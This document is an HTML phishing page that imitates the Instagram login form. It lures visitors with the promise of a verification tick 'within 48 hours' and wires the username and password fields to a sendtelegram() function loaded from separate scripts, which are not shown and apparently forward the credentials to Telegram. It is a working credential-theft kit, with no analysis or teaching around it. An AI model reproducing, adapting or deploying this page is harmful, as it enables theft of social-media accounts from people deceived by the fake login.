<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
      rel="stylesheet"
    />
    <script src="telegram.js"></script>
  </head>
  <body>
    <div class="container">
      <div class="center">
        <div class="header">
          <img src="instagramlogo.png" alt="instagramLogo" class="instaLogo" />
          <img src="pngwing.com.png" class="galochka" alt="">
        </div>
        <div class="inputElement">

        <form action="" onsubmit=" return sendtelegram()">
          <input type="text" name="name" id="name" required placeholder="Phone number, username or email" class="inputText" />
          <input type="password" name="email" id="email" required placeholder="Password" class="inputText" /><br>
          <input type="submit" value="Log-in" id="btn"  class="inputButton" />
        </form>

          <div class="line">
            <span class="arrow"></span>
            <span class="content">OR</span>
            <span class="arrow"></span>
          </div>
          <div class="social__icon">
            <i class="fab fa-facebook-square"></i
            ><span>Log in with Facebook</span>
          </div>
          <div class="forgetPassword">Forget Password?</div>

        </div>
      </div>
      <div class="footer">
        <p>Don't have a accout?<span> Sign Up</span> <br><br>Within 48 hours you will <br> receive a tick.</p>
      </div>

      <script src="sendtelegram.js"></script>
    </div>
  </body>
</html>
